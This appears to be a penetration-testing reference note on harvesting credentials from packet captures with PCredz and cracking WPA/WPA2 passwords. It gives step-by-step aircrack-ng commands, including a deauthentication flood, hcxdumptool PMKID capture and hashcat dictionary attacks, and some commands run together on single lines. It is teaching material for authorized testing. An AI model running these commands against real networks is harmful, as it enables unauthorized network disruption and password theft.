# PCAP & Wireless Password Processing Examples

These examples illustrate how credentials contained within **PCAP files** and **wireless authentication exchanges** may be processed during **authorized security assessments**, audits, or investigations.  
All techniques described here **must only be used with explicit permission** and within the scope of an approved engagement.

---

## PCredz (PCAP Hash Extraction)

**PCredz** extracts authentication material from packet capture files, including NTLM, Kerberos, FTP, HTTP, and other network-based credentials.

Repository:  
[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)

### Common Use Cases

- Offline analysis of captured network traffic
    
- Identifying credential leakage during authentication flows
    
- Supporting post-incident or red team analysis
    

### Extract Hashes From a Single PCAP

`PCredz -f example.pcap`

### Extract Hashes From a Directory of PCAPs

`PCredz -d /path/to/pcaps`

### Live Capture and Extraction

`PCredz -i eth0`

Captured hashes can then be analyzed or passed into cracking tools as part of a controlled assessment.

---

## WPA / WPA2-PSK Authentication (4-Way Handshake)

To analyze WPA/WPA2-PSK networks, the **4-way handshake** must be captured.  
This handshake allows verification of password guesses **without reconnecting to the network**.

### Toolchain

- `airmon-ng`
    
- `airodump-ng`
    
- `aireplay-ng`
    

### Step 1: Enable Monitor Mode

`airmon-ng start wlan0`

### Step 2: Capture Traffic on the Target Channel

`airodump-ng mon0 --write capture.cap -c 11`

### Step 3: Trigger a Reauthentication (Optional)

`aireplay-ng --deauth 0 -a bb:bb:bb:bb:bb:bb mon0`

### Step 4: Confirm Handshake Capture

Look for confirmation in the capture output:

`WPA handshake: **`

---

### Step 5: Convert Handshake for Cracking

#### John the Ripper Format

`cap2hccap.bin -e "<ESSID>" capture.cap capture.hccap hccap2john capture.hccap > jtr_capture.txt`

#### Hashcat Format

`cap2hccapx.bin capture.cap capture.hccapx`

---

## WPA2 PMKID Attack (Handshake-Less Capture)

PMKID attacks allow credential capture **without client deauthentication**, relying instead on access point responses.

### Step 1: Install Required Tools

`git clone https://github.com/ZerBea/hcxdumptool.git cd hcxdumptool && make && make install  git clone https://github.com/ZerBea/hcxtools.git cd hcxtools && make && make install`

### Step 2: Identify Target Access Points

`airodump-ng <interface>`

### Step 3: Capture PMKID

Create a file containing the target BSSID:

`echo A0BB3A6F93 > bssid_target.txt`

Run PMKID capture:

`hcxdumptool -i <interface> \ --filterlist=bssid_target.txt \ --filtermode=2 \ --enable_status=2 \ -o pmkid.pcap`

### Step 4: Convert Capture for Hashcat

`hcxpcaptool -z wpa2_pmkid_hash.txt pmkid.pcap`

### Step 5: Perform Controlled Analysis

`hashcat -a 0 -m 16800 -w 4 wpa2_pmkid_hash.txt dict.txt`

---

## Defensive Interpretation

Wireless and PCAP-based credential analysis is valuable because it shows:

- Where credentials traverse the network
    
- Which authentication protocols expose reusable secrets
    
- How weak passwords fail under realistic pressure
    
- How one captured exchange can unlock broader access
    

These techniques highlight **attack surface**, not just password strength.

---

## Related Tools and References

**PCredz** – [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)

**hcxtools / hcxdumptool** – [https://github.com/ZerBea/hcxtools](https://github.com/ZerBea/hcxtools)

**[[Concept Application - HashCat|Hashcat]]** – [https://hashcat.net](https://hashcat.net)

**[[Concept Application - John the Ripper|John the Ripper]]** – [https://www.openwall.com/john](https://www.openwall.com/john)

---
#education #tools #sudad 

[[Processing]]
[[Home]]